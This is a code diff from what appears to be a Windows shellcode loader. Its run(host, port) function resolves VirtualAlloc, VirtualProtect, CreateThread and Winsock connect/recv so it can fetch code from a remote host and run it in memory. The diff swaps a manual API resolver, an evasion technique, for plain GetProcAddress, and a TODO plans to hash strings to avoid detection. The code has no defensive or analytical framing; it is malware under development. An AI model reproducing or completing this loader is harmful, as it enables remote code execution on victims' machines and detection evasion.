@@ -21,7 +21,7 @@
 #include "../utils/winsock_util.h"
 //#include "payload_util.h"
 #include "../utils/utils.h"
-#include "../utils/kernel32_util.h"
+//#include "../utils/kernel32_util.h"
 
 //#include <stdio.h>
 //#include <stdlib.h>
@@ -39,11 +39,18 @@ int run(const char* host, const char* port)
 
 	// TODO: hash these string literals 
     // TODO: maybe try using regular GetProcAddress to see if everything works then try to use GetProcAddressManual
+	/*
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
 	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
+	*/
+    FARPROC pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
+    FARPROC pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
+    FARPROC pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
+    FARPROC WaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
 
+	/*
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManual("ws2_32.dll", "WSAStartup");
     FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManual("ws2_32.dll", "WSACleanup");
     FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManual("ws2_32.dll", "getaddrinfo");
@@ -53,6 +60,7 @@ int run(const char* host, const char* port)
     FuncConnect pConnect = (FuncConnect)GetProcAddressManual("ws2_32.dll", "connect");
     //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
     FuncRecv pRecv = (FuncRecv)GetProcAddressManual("ws2_32.dll", "recv");
+	*/
 
     //std::cout << "1 - Starting" << std::endl;
 	// printf("1 - Starting\n");
